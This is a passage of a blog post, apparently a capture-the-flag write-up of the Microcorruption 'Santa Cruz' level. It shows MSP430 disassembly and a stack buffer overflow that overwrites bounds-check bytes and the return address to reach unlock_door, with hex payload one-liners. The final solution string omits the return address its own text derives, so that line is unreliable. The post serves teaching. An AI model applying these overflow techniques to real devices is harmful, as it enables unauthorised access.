</span><span style=color:#75715e></span><span style=color:#ae81ff>4652</span>:  <span style=color:#ae81ff>1</span><span style=color:#66d9ef>f42</span> <span style=color:#ae81ff>0024</span>      <span style=color:#66d9ef>mov</span>   <span style=color:#960050;background-color:#1e0010>&amp;</span><span style=color:#ae81ff>0x2400</span>, <span style=color:#66d9ef>r15</span>
<span style=color:#960050;background-color:#1e0010>4656:</span>  <span style=color:#a6e22e>b012</span> <span style=color:#ae81ff>2847</span>      <span style=color:#66d9ef>call</span>  <span style=color:#75715e>#0x4728 &lt;puts&gt;
</span><span style=color:#75715e></span><span style=color:#ae81ff>465</span><span style=color:#66d9ef>a</span>:  <span style=color:#ae81ff>3040</span> <span style=color:#ae81ff>4044</span>      <span style=color:#66d9ef>br</span>    <span style=color:#75715e>#0x4440 &lt;__stop_progExec__&gt;
</span><span style=color:#75715e></span><span style=color:#ae81ff>465</span><span style=color:#66d9ef>e</span>:  <span style=color:#ae81ff>3150</span> <span style=color:#ae81ff>2800</span>      <span style=color:#66d9ef>add</span>   <span style=color:#75715e>#0x28, sp
</span><span style=color:#75715e></span><span style=color:#ae81ff>4662</span>:  <span style=color:#ae81ff>3441</span>           <span style=color:#66d9ef>pop</span>   <span style=color:#66d9ef>r4</span>
<span style=color:#960050;background-color:#1e0010>4664:</span>  <span style=color:#960050;background-color:#1e0010>3</span><span style=color:#a6e22e>b41</span>           <span style=color:#66d9ef>pop</span>   <span style=color:#66d9ef>r11</span>
<span style=color:#960050;background-color:#1e0010>4666:</span>  <span style=color:#960050;background-color:#1e0010>3041</span>           <span style=color:#a6e22e>ret</span>
</code></pre></div><p>Before we leave the routine, a final check is done with <code>tst.b -0x6(r4)</code>. If the value at the memory address at this time is zero, the function would return as normal (based on the <code>jz</code> instruction), otherwise, another abrupt stop would occur.</p>
<p>From the static analysis we can see that three distinct checks are being done. An upper and lower bounds check and an arbitrary null byte check. Time to fuzz the inputs and see how that works out.</p>
<h3 id=debugging>debugging</h3>
<p>Now the very first thing I did here was supply inputs that were longer than the prescribed 16 bytes. A 20 byte username and 20 byte password promptly failed and caused the program to print a &ldquo;password too short&rdquo; message and end.</p>
<figure class=left>
<img src=/images/microcorruption/santa_cruz_input_fuzz1.png>
</figure>
<p>Erm. Wat. I expected the password too long message, not too short? Alright. I figured what would be a better approach would be to first have a look at what a valid run through looks like. Primarily this was to get an idea of what the memory layout looks like when the bounds checks we have identified are being done. I set a breakpoint at <code>0x45d0</code> right after the second <code>strcpy</code> call so that I could see what the memory layout would be together with inputs that were 10 bytes long (aka: within the size limits).</p>
<figure class=left>
<img src=/images/microcorruption/santa_cruz_memory_layout_within_bounds.png>
</figure>
<p>There are a number of observations to make here. The username buffer (which I provided as 10 <code>41</code>&rsquo;s) is padded with zeros up to <code>0x43b3</code>, and the password buffer (which I provided as 10 <code>42</code>&rsquo;s) is padded with zeros up to <code>0x43cc</code>. At <code>0x43cc</code> we have <code>0x4440</code>, which is the start of the <code>__stop_progExec__</code> routine. Between the username and password buffers are the two bytes that were set very early in the <code>login</code> routine.</p>
<p>Finally, given the first attempt to just provide inputs that were clearly too long, we smashed the <code>0x8</code> and <code>0x10</code> values, meaning we control those values!</p>
<p>Stepping through the rest of <code>login</code> one can see the bytes <code>0x8</code> and <code>0x10</code> are used within the bounds checks. This does however seem to only be the case for the password field.</p>
<figure class=left>
<img src=/images/microcorruption/santa_cruz_stack_smash.png>
</figure>
<p>As a final test, I provided a username of 50 <code>44</code>&rsquo;s and a password of 9 <code>41</code>&rsquo;s. The username overrode the two bytes used for bounds checking, as well as the suspected return address for <code>login</code>. The password however was placed at a static offset at <code>0x43b4</code> and terminated with a null byte inside of the username buffer.</p>
<p>It seemed clear at this stage that all I would need to do was set my own values for the password buffer lengths and corrupt the memory past the return address, redirecting the code flow to something like <code>unlock_door</code>.</p>
<p>Given that the bytes used for bounds checking was at offsets 18 and 19 from where the password buffer started, I chose to place the values <code>0x1</code> and <code>0x99</code> as the new min/max values. I then continued to overflow the buffer, hoping to replace the address <code>login</code> would return to to <code>0x4242</code> to test if I can reach it.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>python <span style=color:#f92672>-</span>c <span style=color:#e6db74>&#34;print(&#39;41&#39; * 17 + &#39;0199&#39; + 30 * &#39;42&#39;)&#34;</span>
<span style=color:#ae81ff>41414141414141414141414141414141410199424242424242424242424242424242424242424242424242424242424242</span>
</code></pre></div><p>With my username payload ready, I simply provided two bytes for the password as <code>4343</code>.</p>
<figure class=left>
<img src=/images/microcorruption/santa_cruz_payload_1.png>
</figure>
<p>This time round, I passed the two bounds checks that occur between <code>0x45ec</code> and <code>0x460c</code>. The HSM did not validate the password I provided (no surprise there), but after the <code>That password is not correct.</code>, another <code>Invalid Password Length: password too long.</code> message was printed. This has to be as a result of that <code>tst.b -0x6(r4)</code> call towards the end of <code>login</code>.</p>
<p>Setting a breakpoint at <code>0x464c</code>, I inspected the memory contents that was being tested. For reference, lets have one more look at the end of the <code>login</code> routine as well:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=color:#960050;background-color:#1e0010>464</span>c:  <span style=color:#a6e22e>c493</span> <span style=color:#66d9ef>faff</span>      <span style=color:#66d9ef>tst.b</span> -<span style=color:#ae81ff>0x6</span>(<span style=color:#66d9ef>r4</span>)
<span style=color:#960050;background-color:#1e0010>4650:</span>  <span style=color:#960050;background-color:#1e0010>0624</span>           <span style=color:#a6e22e>jz</span>    <span style=color:#75715e>#0x465e &lt;login+0x10e&gt;
</span><span style=color:#75715e></span><span style=color:#ae81ff>4652</span>:  <span style=color:#ae81ff>1</span><span style=color:#66d9ef>f42</span> <span style=color:#ae81ff>0024</span>      <span style=color:#66d9ef>mov</span>   <span style=color:#960050;background-color:#1e0010>&amp;</span><span style=color:#ae81ff>0x2400</span>, <span style=color:#66d9ef>r15</span>
<span style=color:#960050;background-color:#1e0010>4656:</span>  <span style=color:#a6e22e>b012</span> <span style=color:#ae81ff>2847</span>      <span style=color:#66d9ef>call</span>  <span style=color:#75715e>#0x4728 &lt;puts&gt;
</span><span style=color:#75715e></span><span style=color:#ae81ff>465</span><span style=color:#66d9ef>a</span>:  <span style=color:#ae81ff>3040</span> <span style=color:#ae81ff>4044</span>      <span style=color:#66d9ef>br</span>    <span style=color:#75715e>#0x4440 &lt;__stop_progExec__&gt;
</span><span style=color:#75715e></span><span style=color:#ae81ff>465</span><span style=color:#66d9ef>e</span>:  <span style=color:#ae81ff>3150</span> <span style=color:#ae81ff>2800</span>      <span style=color:#66d9ef>add</span>   <span style=color:#75715e>#0x28, sp
</span><span style=color:#75715e></span><span style=color:#ae81ff>4662</span>:  <span style=color:#ae81ff>3441</span>           <span style=color:#66d9ef>pop</span>   <span style=color:#66d9ef>r4</span>
<span style=color:#960050;background-color:#1e0010>4664:</span>  <span style=color:#960050;background-color:#1e0010>3</span><span style=color:#a6e22e>b41</span>           <span style=color:#66d9ef>pop</span>   <span style=color:#66d9ef>r11</span>
<span style=color:#960050;background-color:#1e0010>4666:</span>  <span style=color:#960050;background-color:#1e0010>3041</span>           <span style=color:#a6e22e>ret</span>
</code></pre></div><p>In order for us to take the jump at <code>0x4650</code> to <code>0x465e</code> (bypassing the abrupt stop), we need to have the byte at <code>-0x6(r4)</code> be null.</p>
<figure class=left>
<img src=/images/microcorruption/santa_cruz_null_byte_check.png>
</figure>
<p>Running the program with our <code>4343</code> payload as the password, we can see we have a <code>42</code> at <code>0x43c6</code> (which is <code>0x43cc</code> - <code>0x6</code>). We know that the end of our username and password buffers have null bytes in memory, so we could use that to get this final null byte written for the check to pass.</p>
<p>We two options here. We could use the username field to overflow up to where the null byte should be written, and then provide the rest of the payload as the password field as one option. We could also use the password field to simply pad up to the null byte field and have that written there, keeping our primary payload in the username field. I opted for the latter. Inspecting the memory layout, one can see that the null byte should be at offset 18 from the start of the password buffer.</p>
<p>Generating the username payload was now done as follows:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#960050;background-color:#1e0010>$</span> python <span style=color:#f92672>-</span>c <span style=color:#e6db74>&#34;print(&#39;41&#39; * 17 + &#39;0199&#39; + &#39;44&#39; * 30)&#34;</span>
<span style=color:#ae81ff>41414141414141414141414141414141430199444444444444444444444444444444444444444444444444444444444444</span>
</code></pre></div><p>The password payload on the other hand was (with an expectation of a nullbyte at pos 18):</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#960050;background-color:#1e0010>$</span> python <span style=color:#f92672>-</span>c <span style=color:#e6db74>&#34;print(&#39;42&#39; * 17)&#34;</span>
<span style=color:#ae81ff>4242424242424242424242424242424242</span>
</code></pre></div>
<figure class=left>
<img src=/images/microcorruption/santa_cruz_null_byte_check.png>
</figure>
<p>Woohoo! The byte at <code>0x43c6</code> is now <code>0x0</code>, bypassing the check. If we were to continue execution at this point, we would end up at invalid instructions and a message such as <code>insn address unaligned</code> within the debugger. This is good news!</p>
<p>The only thing that is left for us to do is to set the address to jump to when <code>login</code> returns. This was at offset 23 from the username buffer. A routine called <code>unlock_door</code> started at <code>0x444a</code> (so <code>4a44</code> for endianness) which called the correct interrupt to unlock the lock. So, keeping our password field as is, we generate the username with:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#960050;background-color:#1e0010>$</span> python <span style=color:#f92672>-</span>c <span style=color:#e6db74>&#34;print(&#39;41&#39; * 17 + &#39;0199&#39; + &#39;44&#39; * 23 + &#39;4a44&#39;)&#34;</span>
<span style=color:#ae81ff>4141414141414141414141414141414141019944444444444444444444444444444444444444444444444</span>a44
</code></pre></div>
<figure class=left>
<img src=/images/microcorruption/santa_cruz_unlocked.png>
</figure>
<h2 id=solution>solution</h2>
<p>Enter <code>41414141414141414141414141414141430199444444444444444444444444444444444444444444444444444444444444</code> as hex encoded input for the username and <code>4242424242424242424242424242424242</code> as hex encoded input for the password.</p>
<h2 id=other-challenges>other challenges</h2>
<p>For my other write ups in the microcorruption series, checkout <a href=https://leonjza.github.io/categories/microcorruption/>this</a> link.</p>
</div>
<div class=pagination>
<div class=pagination__title>
<span class=pagination__title-h>Read other posts</span>
<hr>
</div>
<div class=pagination__buttons>
<span class="button previous">
<a href=https://leonjza.github.io/blog/2020/12/30/the-2020-kinglecon-3-holiday-hack-challenge/>
<span class=button__icon>←</span>
<span class=button__text>the 2020 kinglecon 3 holiday hack challenge</span>
</a>
</span>
<span class="button next">
<a href=https://leonjza.github.io/blog/2018/03/09/microcorruption-johannesburg/>
<span class=button__text>microcorruption - johannesburg</span>
<span class=button__icon>→</span>
</a>
</span>
</div>
</div>
</div>
</div>
<footer class=footer>
<div class=footer__inner>
<div class="copyright copyright--user"><a href=https://twitter.com/leonjza>@leonjza</a></div>
</div>
</footer>
<script src=https://leonjza.github.io/assets/main.js></script>
<script src=https://leonjza.github.io/assets/prism.js></script>
</div>
<script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-44457032-2','auto'),ga('send','pageview'))</script>
</body>
</html>